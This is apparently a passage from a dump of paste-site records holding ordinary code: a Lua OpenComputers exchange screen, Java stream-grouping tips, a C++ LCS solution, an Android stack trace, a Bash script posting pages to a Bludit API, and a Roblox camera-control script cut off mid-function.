    -- Каджый 10 такт обновляем экран
    for i = 1, 10 do
        coroutine.yield()
    end
end
local oreTimer = coroutine.create(oreTimeFn)
 
function draw_img(img, x, y, fore, back)
    fore = fore or 0xffffff
    back = back or 0x0
    oldFG = gpu.getForeground()
    gpu.setForeground(fore)
    local i = 0
    for line in img:gmatch(""([^\n]*)\n?"") do
        gpu.set(x, y + i, line)
        i = i + 1
    end
    gpu.setForeground(oldFG)
end
local img =
    [[
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡐⢆⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠠⡐⣄⢢⡐⢄⢢⡐⣄⠂⡄⠀⠀⢄⢢⢰⣀⢦⡐⣄⢢⡐⠄⣂⠆⠀⠀⢀⡐⢦⠹⠌⠀⢀⡰⢠⠀⠐⣠⠀⠀⠀⠀⠀⠀⠀⠀⠄⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠂⡄⠀⠀⠀⠀⠌⡤⠃⠀⢳⡌⠃⠘⠈⠂⠑⠈⠑⠀⠀⡜⡢⠍⠂⠑⠈⠑⠈⠃⠀⠐⣌⠎⢀⡐⠦⣜⠂⠁⠀⠀⠀⡜⡡⠂⠘⠤⡁⠀⠀⠀⠀⠀⠀⠀⢂⠱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⠑⡌⢢⠀⠤⣉⡜⣰⠁⠀⡣⢝⠀⠀⠀⠀⠀⠀⠀⠀⢀⠳⣹⢌⡱⢢⡱⢌⢲⢰⡀⠀⢎⠺⣤⣙⠳⣀⠀⠀⠀⠀⠠⣙⠦⠁⢨⣑⠂⠀⠀⠀⠀⠀⠀⠀⢌⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⡑⠈⠒⡭⠒⠌⠸⣡⠃⠀⣙⠮⡄⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠁⠁⠉⣈⠞⡢⠄⠈⢎⡳⠂⠉⠳⢆⡆⣀⠀⠀⠐⡌⠦⠁⠠⣃⠎⠀⠀⠀⠀⠀⠀⠀⠌⢒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⡄⠁⠀⠀⠁⠀⠰⣡⠂⠀⠈⠸⣑⢋⢆⢳⡘⣔⠣⢆⢠⠱⣊⡕⣎⢖⡱⢎⠞⠁⠀⠈⣎⠱⠀⠀⠀⠈⠲⣡⠢⠄⠀⡜⡡⠂⠐⡥⢊⡴⢡⠎⡤⢁⠆⠀⠘⡀⠎⡐⢂⠰⠀⠆⡀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢌⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ]]
 
function copyleft()
    local text = {
        {""Авторы: "", 0x444444, w - 35},
        {""Rijen, Furryonelove"", 0x64fff2, w - 28}
    }
    local startPos = w - 32
    for i, str in pairs(text) do
        gpu.setForeground(str[2])
        gpu.set(str[3], h - 1, str[1])
    end
 
    gpu.setBackground(defBG)
    gpu.setForeground(defFG)
end
 
gpu.fill(1, 1, w, h, "" "")
center(h - 15, ""Для обмена встаньте на PIM и не сходите до окончания обмена"", 0xffffff)
draw_img(img, 1, h - 13, 0x00a400)
copyleft()
 
while true do
    drawStat()
 
    handleEvent(event.pull(1))
 
    if coroutine.status(oreTimer) == ""dead"" then
        oreTimer = coroutine.create(oreTimeFn)
    else
        coroutine.resume(oreTimer)
    end
end"
UzmX69k2,Napredno tips,dzocesrce,Java,Sunday 8th of June 2025 07:25:46 AM CDT,"1. GROUPING BY EXAMPLE    
public Map<Integer, Set<File>> byYear() {
        return files.stream()
                .collect(Collectors.groupingBy(
                        file -> file.getCreateAt().getYear(),
                        Collectors.toSet()
                ));
    }
2. GROUPING BY EXAMPLE
Map<String, Set<Employee>> employeesByLevels = employees.stream()
                .filter(i -> levels.contains(i.getLevel()))
                .collect(Collectors.groupingBy(
                        Employee::getLevel,
                        TreeMap::new, // map sorted by key
                        Collectors.toCollection(() -> new TreeSet<>(Comparator.comparing(Employee::getSalary,Comparator.reverseOrder()))) // values sorted too
                ));
            return employeesByLevels;

3. SORTING IN A MAP
Map<String, List<Shape>> shapesByUser = shapes.stream()
                .collect(Collectors.groupingBy(
                        Shape::getId,
                        Collectors.toList()
                ))
                .entrySet()
                .stream()
                .sorted(Comparator
                        .<Map.Entry<String, List<Shape>>>comparingInt(e -> e.getValue().size())
                        .reversed()
                        .thenComparingDouble(e -> e.getValue().stream().mapToDouble(Shape::getArea).sum())
                        .reversed()
                )
                .collect(Collectors.toMap(
                        Map.Entry::getKey,
                        e -> e.getValue().stream()
                                .sorted(Comparator.comparingDouble(Shape::getPerimeter).reversed())
                                .collect(Collectors.toList()),
                        (e1, e2) -> e1,
                        LinkedHashMap::new
                ));

4. ATOMIC INTEGER

AtomicInteger counter = new AtomicInteger(1);
        paymentList.stream().filter(i->i.index.equals(id))
                .sorted(Comparator.comparing(Payment::getPrice,Comparator.reverseOrder()))
                .forEach(i->printStream.println(String.format(""%d. %s %d"",
                        counter.getAndIncrement(),i.title,i.price)));

5. FLATMAP 

studentsByBranch = studentsByBranch.entrySet().stream().sorted(
                Comparator.comparingLong(e->e.getValue().stream().flatMap(i->i.getGrades()
                        .stream()).filter(i->i==10).count())
        ).collect(Collectors.toMap(
                Map.Entry::getKey,
                Map.Entry::getValue,
                (e1,e2)->e1,
                LinkedHashMap::new
        ));
        List<String> branches = studentsByBranch.keySet().stream().collect(Collectors.toList()).reversed();
        for(String branch : branches){
            Map<Integer,Long> numberOfStudentsPerGrade = studentsByBranch.get(branch).stream()
                    .flatMap(s -> s.getGrades().stream())
                    .collect(Collectors.groupingBy(
                    e->e.intValue(),
                    TreeMap::new,
                    Collectors.counting()
            ));
            printStream.println(branch);
            numberOfStudentsPerGrade.entrySet().stream().forEach(
                    i-> printStream.println(String.format(""%d | (%d)"",i.getKey(),i.getValue()))
            );
        }

6. COLLECTORS JOINING
String[] allCourses = studentsByIndex.values().stream()
                .map(i->i.getCoursesByTerm().values().stream().flatMap(c->c.stream()).collect(Collectors.joining("","")))
                .collect(Collectors.joining("","")).split("","");

7. MORE MAP SORTING

gamesByTeam.entrySet().stream()
                .sorted(Comparator.comparing(
                                (Map.Entry<String, Team> e) -> e.getValue().getPoints(),
                                Comparator.reverseOrder())
                        .thenComparing(e -> e.getValue().getGoalDifference(),
                                Comparator.reverseOrder())
                        .thenComparing(e->e.getKey()))


8. MAP GROUPING BY 0 PROBLEM

  return IntStream.range(5, 11)
                .boxed()
                .collect(Collectors.toMap(
                        grade -> grade,
                        grade -> studentsByGrade.getOrDefault(grade, 0L),
                        (a, b) -> a,
                        TreeMap::new
                ));"
FPJYSFWq,Untitled,Josif_tepe,C++,Sunday 8th of June 2025 06:48:16 AM CDT,"#include <iostream>
#include <cstring>
using namespace std;
string a, b;
int dp[1001][1001];
int rec(int i, int j) {
    if(i < 0 or j < 0) {
        return 0;
    }
    if(dp[i][j] != -1) {
        return dp[i][j];
    }
    int res = 0;
    res = max(res, rec(i - 1, j));
    res = max(res, rec(i, j - 1));
    
    if(a[i] == b[j]) {
        res = max(res, rec(i - 1, j - 1) + 1);
    }
    dp[i][j] = res;
    return res;
}
int main()
{
    cin >> a >> b;
    memset(dp, -1, sizeof dp);
    cout << rec(a.size() - 1, b.size() - 1) << endl;
    
    return 0;
}
"
jLkmp8Ut,2025-06-08T13:40:04.280,powerampache,PHP,Sunday 8th of June 2025 06:40:04 AM CDT,"1.01-76 (76) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:938)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loop(Looper.java:236)
	at android.app.ActivityThread.main(ActivityThread.java:8061)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:656)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:967)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[],""suppressedExceptions"":[]}"
c9qu21NJ,dataNone,TestGuy1,JSON,Sunday 8th of June 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'aba446e77af8139e94254921546491b56ec24e4cc0ffa41b66baf423de826b2ce83dcb57c9bd18420e8ac71044d6f86511913556a95c39427d044361b0848e089047ae6993926f687bbe4146c89644b6ede3c989f73577e39e3e38db0b9bb13b8cb2bfa5d1b0614ad3a23f7d839b2e6dfa6b5877e6383b374c674f8bb7679535',
  otherdata: [
    '6612463442001a95108d500499c3809a',
    '6d85b241abdfbd500a18828ecdfef785',
    'ba5b12b133e246806ff13610847a755f',
    '8ab6f3edfc6d0a70818d5ac5e0230200',
    '8d927bae514f48692688744e823233bd',
    '8546011254e8e6bcc0467b299405fd64',
    'abb1e78c402d9c3966614b53ebd32611',
    'eb8e7bf3f1efa7cbec38c57f132456f6'
  ]
}"
uhvjbgt3,CLI Bludit,snick512,Bash,Sunday 8th of June 2025 05:05:38 AM CDT,"#!/bin/bash
# Create .page_config
# API_URL=""https://example.com/api/pages""
# TOKEN=""""
# AUTH=""""
# 
set -euo pipefail

# Load secure configuration
CONFIG_FILE="".page_config""
if [[ ! -f ""$CONFIG_FILE"" ]]; then
    echo ""❌ Missing .page_config file. Please create it with API_URL, TOKEN, and AUTH.""
    exit 1
fi
source ""$CONFIG_FILE""

# --- Parse command-line arguments ---
TITLE=""""
TAGS=""""
while [[ ""$#"" -gt 0 ]]; do
    case ""$1"" in
        --title)
            TITLE=""$2""
            shift 2
            ;;
        --tags)
            TAGS=""$2""
            shift 2
            ;;
        *)
            echo ""❌ Unknown option: $1""
            echo ""Usage: $0 --title \""My Title\"" --tags \""tag1,tag2\""""
            exit 1
            ;;
    esac
done

# --- Validate input ---
if [[ -z ""$TITLE"" || -z ""$TAGS"" ]]; then
    echo ""❌ Error: Both --title and --tags are required.""
    exit 1
fi

# --- Sanitize title into slug ---
SLUG=$(echo ""$TITLE"" | tr '[:upper:]' '[:lower:]' | sed -E 's/[^a-z0-9 ]//g' | tr ' ' '-' | sed 's/-\+/-/g' | sed 's/^-//;s/-$//')

# --- Secure temp file for markdown input ---
TMP_FILE=$(mktemp ""/tmp/markdown_XXXXXX.md"")
trap 'shred -u ""$TMP_FILE"" 2>/dev/null' EXIT

echo ""# Replace with your content"" > ""$TMP_FILE""
${EDITOR:-nano} ""$TMP_FILE""

# --- Read Markdown content ---
CONTENT=$(<""$TMP_FILE"")

# --- Secure JSON construction (no temp payload file) ---
JSON=$(jq -n \
    --arg token ""$TOKEN"" \
    --arg auth ""$AUTH"" \
    --arg title ""$TITLE"" \
    --arg content ""$CONTENT"" \
    --arg slug ""$SLUG"" \
    --arg tags ""$TAGS"" \
    '{
      token: $token,
      authentication: $auth,
      title: $title,
      content: $content,
      slug: $slug,
      tags: $tags
    }')

# --- Send POST request ---
echo ""🚀 Posting securely to $API_URL ...""
RESPONSE=$(curl -s -X POST ""$API_URL"" \
    -H ""Content-Type: application/json"" \
    -d ""$JSON"")

# --- Show response ---
echo ""📬 Response:""
echo ""$RESPONSE""
"
uCG9MLHL,Gagaga,Kyirxuz,Lua,Sunday 8th of June 2025 04:35:05 AM CDT,"local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")
local Players = game:GetService(""Players"")
local TweenService = game:GetService(""TweenService"")

local CONFIG = {
    TRIGGER_KEY = Enum.KeyCode.X,
    CAMERA_POINTS = {
        Vector3.new(284, 25, 257),
        Vector3.new(248, 25, 257),
        Vector3.new(248, 25, -226),
        Vector3.new(283, 25, -226)
    },
    INDICATOR_SIZE = UDim2.new(0, 20, 0, 20),
    SMOOTHING_SPEED = 0.2,
    MAX_OFFSET = 180,        
    OFFSET_SCALING = .7,
    GUI_TOGGLE_KEY = Enum.KeyCode.G -- Key to toggle the GUI
}

local camera = workspace.CurrentCamera
local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- State tracking
local isKeyHeld = false
local selectedPoint = nil
local indicators = {}
local initialLookVector = nil
local isAHeld = false
local isDHeld = false
local scriptEnabled = true
local settingsGui = nil

-- Key name mappings for display
local keyNames = {
    [Enum.KeyCode.A] = ""A"", [Enum.KeyCode.B] = ""B"", [Enum.KeyCode.C] = ""C"", [Enum.KeyCode.D] = ""D"",
    [Enum.KeyCode.E] = ""E"", [Enum.KeyCode.F] = ""F"", [Enum.KeyCode.G] = ""G"", [Enum.KeyCode.H] = ""H"",
    [Enum.KeyCode.I] = ""I"", [Enum.KeyCode.J] = ""J"", [Enum.KeyCode.K] = ""K"", [Enum.KeyCode.L] = ""L"",
    [Enum.KeyCode.M] = ""M"", [Enum.KeyCode.N] = ""N"", [Enum.KeyCode.O] = ""O"", [Enum.KeyCode.P] = ""P"",
    [Enum.KeyCode.Q] = ""Q"", [Enum.KeyCode.R] = ""R"", [Enum.KeyCode.S] = ""S"", [Enum.KeyCode.T] = ""T"",
    [Enum.KeyCode.U] = ""U"", [Enum.KeyCode.V] = ""V"", [Enum.KeyCode.W] = ""W"", [Enum.KeyCode.X] = ""X"",
    [Enum.KeyCode.Y] = ""Y"", [Enum.KeyCode.Z] = ""Z"",
    [Enum.KeyCode.One] = ""1"", [Enum.KeyCode.Two] = ""2"", [Enum.KeyCode.Three] = ""3"", [Enum.KeyCode.Four] = ""4"",
    [Enum.KeyCode.Five] = ""5"", [Enum.KeyCode.Six] = ""6"", [Enum.KeyCode.Seven] = ""7"", [Enum.KeyCode.Eight] = ""8"",
    [Enum.KeyCode.Nine] = ""9"", [Enum.KeyCode.Zero] = ""0"",
    [Enum.KeyCode.LeftShift] = ""L-Shift"", [Enum.KeyCode.RightShift] = ""R-Shift"",
    [Enum.KeyCode.LeftControl] = ""L-Ctrl"", [Enum.KeyCode.RightControl] = ""R-Ctrl"",
    [Enum.KeyCode.LeftAlt] = ""L-Alt"", [Enum.KeyCode.RightAlt] = ""R-Alt"",
    [Enum.KeyCode.Space] = ""Space"", [Enum.KeyCode.Tab] = ""Tab""
}

local function createSettingsGui()
    local screenGui = Instance.new(""ScreenGui"")
    screenGui.Name = ""CameraControlSettings""
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    -- Main frame
    local mainFrame = Instance.new(""Frame"")
    mainFrame.Name = ""MainFrame""
    mainFrame.Size = UDim2.new(0, 300, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -175)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui

    local mainCorner = Instance.new(""UICorner"")
    mainCorner.CornerRadius = UDim.new(0, 8)
    mainCorner.Parent = mainFrame

    -- Title
    local titleLabel = Instance.new(""TextLabel"")
    titleLabel.Name = ""Title""
    titleLabel.Size = UDim2.new(1, 0, 0, 40)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = ""Camera Control Settings""
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Parent = mainFrame

    -- Close button
    local closeButton = Instance.new(""TextButton"")
    closeButton.Name = ""CloseButton""
    closeButton.Size = UDim2.new(0, 30, 0, 30)
    closeButton.Position = UDim2.new(1, -35, 0, 5)
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeButton.Text = ""X""
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextScaled = true
    closeButton.Font = Enum.Font.SourceSansBold
    closeButton.Parent = mainFrame

    local closeCorner = Instance.new(""UICorner"")
    closeCorner.CornerRadius = UDim.new(0, 4)
    closeCorner.Parent = closeButton

    -- Enable/Disable Toggle
    local enableFrame = Instance.new(""Frame"")
    enableFrame.Size = UDim2.new(1, -20, 0, 50)
    enableFrame.Position = UDim2.new(0, 10, 0, 50)
    enableFrame.BackgroundTransparency = 1
    enableFrame.Parent = mainFrame

    local enableLabel = Instance.new(""TextLabel"")
    enableLabel.Size = UDim2.new(0.6, 0, 1, 0)
    enableLabel.Position = UDim2.new(0, 0, 0, 0)
    enableLabel.BackgroundTransparency = 1
    enableLabel.Text = ""Script Enabled:""
    enableLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    enableLabel.TextScaled = true
    enableLabel.Font = Enum.Font.SourceSans
    enableLabel.TextXAlignment = Enum.TextXAlignment.Left
    enableLabel.Parent = enableFrame

    local enableToggle = Instance.new(""TextButton"")
    enableToggle.Name = ""EnableToggle""
    enableToggle.Size = UDim2.new(0.3, 0, 0, 30)
    enableToggle.Position = UDim2.new(0.65, 0, 0, 10)
    enableToggle.BackgroundColor3 = scriptEnabled and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
    enableToggle.Text = scriptEnabled and ""ON"" or ""OFF""
    enableToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    enableToggle.TextScaled = true
    enableToggle.Font = Enum.Font.SourceSansBold
    enableToggle.Parent = enableFrame

    local enableCorner = Instance.new(""UICorner"")
    enableCorner.CornerRadius = UDim.new(0, 4)
    enableCorner.Parent = enableToggle

    -- Trigger Key Setting
    local keyFrame = Instance.new(""Frame"")
    keyFrame.Size = UDim2.new(1, -20, 0, 50)
    keyFrame.Position = UDim2.new(0, 10, 0, 110)
    keyFrame.BackgroundTransparency = 1
    keyFrame.Parent = mainFrame

    local keyLabel = Instance.new(""TextLabel"")
    keyLabel.Size = UDim2.new(0.5, 0, 1, 0)
    keyLabel.Position = UDim2.new(0, 0, 0, 0)
    keyLabel.BackgroundTransparency = 1
    keyLabel.Text = ""Trigger Key:""
    keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    keyLabel.TextScaled = true
    keyLabel.Font = Enum.Font.SourceSans
    keyLabel.TextXAlignment = Enum.TextXAlignment.Left
    keyLabel.Parent = keyFrame

    local keyButton = Instance.new(""TextButton"")
    keyButton.Name = ""KeyButton""
    keyButton.Size = UDim2.new(0.4, 0, 0, 30)
    keyButton.Position = UDim2.new(0.55, 0, 0, 10)
    keyButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    keyButton.Text = keyNames[CONFIG.TRIGGER_KEY] or ""X""
    keyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    keyButton.TextScaled = true
    keyButton.Font = Enum.Font.SourceSans
    keyButton.Parent = keyFrame

    local keyCorner = Instance.new(""UICorner"")
    keyCorner.CornerRadius = UDim.new(0, 4)
    keyCorner.Parent = keyButton

    -- Max Offset Setting
    local offsetFrame = Instance.new(""Frame"")
    offsetFrame.Size = UDim2.new(1, -20, 0, 70)
    offsetFrame.Position = UDim2.new(0, 10, 0, 170)
    offsetFrame.BackgroundTransparency = 1
    offsetFrame.Parent = mainFrame

    local offsetLabel = Instance.new(""TextLabel"")
    offsetLabel.Size = UDim2.new(1, 0, 0, 30)
    offsetLabel.Position = UDim2.new(0, 0, 0, 0)
    offsetLabel.BackgroundTransparency = 1
    offsetLabel.Text = ""Max Offset: "" .. CONFIG.MAX_OFFSET
    offsetLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    offsetLabel.TextScaled = true
    offsetLabel.Font = Enum.Font.SourceSans
    offsetLabel.TextXAlignment = Enum.TextXAlignment.Left
    offsetLabel.Parent = offsetFrame

    local offsetTextBox = Instance.new(""TextBox"")
    offsetTextBox.Name = ""OffsetTextBox""
    offsetTextBox.Size = UDim2.new(1, 0, 0, 30)
    offsetTextBox.Position = UDim2.new(0, 0, 0, 35)
    offsetTextBox.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    offsetTextBox.Text = tostring(CONFIG.MAX_OFFSET)
    offsetTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    offsetTextBox.TextScaled = true
    offsetTextBox.Font = Enum.Font.SourceSans
    offsetTextBox.PlaceholderText = ""Enter max offset value""
    offsetTextBox.Parent = offsetFrame

    local offsetBoxCorner = Instance.new(""UICorner"")
    offsetBoxCorner.CornerRadius = UDim.new(0, 4)
    offsetBoxCorner.Parent = offsetTextBox

    -- Offset Scaling Setting
    local scalingFrame = Instance.new(""Frame"")
    scalingFrame.Size = UDim2.new(1, -20, 0, 70)
    scalingFrame.Position = UDim2.new(0, 10, 0, 250)
    scalingFrame.BackgroundTransparency = 1
    scalingFrame.Parent = mainFrame

    local scalingLabel = Instance.new(""TextLabel"")
    scalingLabel.Size = UDim2.new(1, 0, 0, 30)
    scalingLabel.Position = UDim2.new(0, 0, 0, 0)
    scalingLabel.BackgroundTransparency = 1
    scalingLabel.Text = ""Offset Scaling: "" .. CONFIG.OFFSET_SCALING
    scalingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    scalingLabel.TextScaled = true
    scalingLabel.Font = Enum.Font.SourceSans
    scalingLabel.TextXAlignment = Enum.TextXAlignment.Left
    scalingLabel.Parent = scalingFrame

    local scalingTextBox = Instance.new(""TextBox"")
    scalingTextBox.Name = ""ScalingTextBox""
    scalingTextBox.Size = UDim2.new(1, 0, 0, 30)
    scalingTextBox.Position = UDim2.new(0, 0, 0, 35)
    scalingTextBox.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    scalingTextBox.Text = tostring(CONFIG.OFFSET_SCALING)
    scalingTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    scalingTextBox.TextScaled = true
    scalingTextBox.Font = Enum.Font.SourceSans
    scalingTextBox.PlaceholderText = ""Enter scaling value (0.1 - 2.0)""
    scalingTextBox.Parent = scalingFrame

    local scalingBoxCorner = Instance.new(""UICorner"")
    scalingBoxCorner.CornerRadius = UDim.new(0, 4)
    scalingBoxCorner.Parent = scalingTextBox

    -- Event connections
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
        settingsGui = nil
    end)

    enableToggle.MouseButton1Click:Connect(function()
        scriptEnabled = not scriptEnabled
        enableToggle.BackgroundColor3 = scriptEnabled and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
        enableToggle.Text = scriptEnabled and ""ON"" or ""OFF""
        
        if not scriptEnabled and isKeyHeld then
            -- Stop camera control if script is disabled
            isKeyHeld = false
            selectedPoint = nil
            local indicatorsGui = player.PlayerGui:FindFirstChild(""CameraPointIndicators"")
            if indicatorsGui then
                indicatorsGui:Destroy()
            end
            RunService:UnbindFromRenderStep(""ProximityCameraControl"")
        end
    end)

    local isWaitingForKey = false
    keyButton.MouseButton1Click:Connect(function()
        if isWaitingForKey then return end
        isWaitingForKey = true
        keyButton.Text = ""Press Key...""
        keyButton.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
        
        local connection
        connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.UserInputType == Enum.UserInputType.Keyboard then
                CONFIG.TRIGGER_KEY = input.KeyCode
                keyButton.Text = keyNames[input.KeyCode] or input.KeyCode.Name
                keyButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
                isWaitingForKey = false
                connection:Disconnect()
            end
        end)
    end)

    offsetTextBox.FocusLost:Connect(function()
        local newValue = tonumber(offsetTextBox.Text)
        if newValue and newValue >= 0 and newValue <= 1000 then
            CONFIG.MAX_OFFSET = newValue
            offsetLabel.Text = ""Max Offset: "" .. CONFIG.MAX_OFFSET
        else
            offsetTextBox.Text = tostring(CONFIG.MAX_OFFSET)
        end
    end)

    scalingTextBox.FocusLost:Connect(function()
        local newValue = tonumber(scalingTextBox.Text)
        if newValue and newValue >= 0.1 and newValue <= 2.0 then
            CONFIG.OFFSET_SCALING = newValue
            scalingLabel.Text = ""Offset Scaling: "" .. CONFIG.OFFSET_SCALING
        else
            scalingTextBox.Text = tostring(CONFIG.OFFSET_SCALING)
        end
    end)

    screenGui.Parent = player.PlayerGui
    return screenGui
end

local function createIndicators()
    local screenGui = Instance.new(""ScreenGui"")
    screenGui.Name = ""CameraPointIndicators""
    screenGui.ResetOnSpawn = false

    for i, point in ipairs(CONFIG.CAMERA_POINTS) do
        local frame = Instance.new(""Frame"")
        frame.Size = CONFIG.INDICATOR_SIZE
        frame.AnchorPoint = Vector2.new(0.5, 0.5)
        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0) 
        frame.BorderSizePixel = 0

        local corner = Instance.new(""UICorner"")
        corner.CornerRadius = UDim.new(1, 0) 
        corner.Parent = frame

        frame.Parent = screenGui
        indicators[i] = frame
    end

    screenGui.Parent = player.PlayerGui
    return screenGui
end

local function updateIndicators()
    for i, point in ipairs(CONFIG.CAMERA_POINTS) do
        local screenPos, isOnScreen = camera:WorldToScreenPoint(point)
        local indicator = indicators[i]

        if isOnScreen then
            indicator.Position = UDim2.new(0, screenPos.X, 0, screenPos.Y)
            indicator.Visible = true
            
            indicator.BackgroundColor3 = (point == selectedPoint)
                and Color3.fromRGB(0, 255, 0)  
                or Color3.fromRGB(255, 0, 0)   
        else
            indicator.Visible = false
        end
    end
end

local function findClosestPoint()
    local closestPoint = CONFIG.CAMERA_POINTS[1]
    local closestDistance = math.huge

    for _, point in ipairs(CONFIG.CAMERA_POINTS) do
        local screenPos, isOnScreen = camera:WorldToScreenPoint(point)
        if isOnScreen then
            local distance = (Vector2.new(mouse.X, mouse.Y) - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
            if distance < closestDistance then
                closestDistance = distance
                closestPoint = point
            end
        end
    end

    return closestPoint
end

local function updateCamera()
    if not isKeyHeld or not selectedPoint or not scriptEnabled then return end
    
    updateIndicators()

    local characterPosition = player.Character and player.Character:FindFirstChild(""HumanoidRootPart"")
        and player.Character.HumanoidRootPart.Position
        or camera.CFrame.Position

    local distanceToPoint = (characterPosition - selectedPoint).Magnitude

    local offsetAmount
    if distanceToPoint <= 13 then
        offsetAmount = 0
    else
        offsetAmount = math.min(distanceToPoint * CONFIG.OFFSET_SCALING, CONFIG.MAX_OFFSET)
    end

    local offsetPosition = selectedPoint

    local dir = (selectedPoint - characterPosition)
    dir = Vector3.new(dir.X, 0, dir.Z).Unit

    local rightVector = dir:Cross(Vector3.new(0, 1, 0)).Unit

    local distanceToPoint = (characterPosition - selectedPoint).Magnitude
    local offsetAmount
    if distanceToPoint <= 13 then
        offsetAmount = 0
    else
        offsetAmount = math.min(distanceToPoint * CONFIG.OFFSET_SCALING, CONFIG.MAX_OFFSET) * 1.07
    end

    local offsetPosition = selectedPoint

    if isAHeld then
        offsetPosition = offsetPosition 
            + Vector3.new(0, offsetAmount, 0)        
            + rightVector * offsetAmount            
    elseif isDHeld then
        offsetPosition = offsetPosition 
            + Vector3.new(0, offsetAmount, 0)        
            - rightVector * offsetAmount            
    end

    local targetCFrame = CFrame.lookAt(characterPosition, offsetPosition)
    local currentCFrame = camera.CFrame
    local newCFrame = currentCFrame:Lerp(targetCFrame, CONFIG.SMOOTHING_SPEED)
    camera.CFrame = CFrame.new(currentCFrame.Position) * CFrame.fromOrientation(newCFrame:ToOrientation())

    local targetCFrame = CFrame.lookAt(characterPosition, offsetPosition)

    local currentCFrame = camera.CFrame
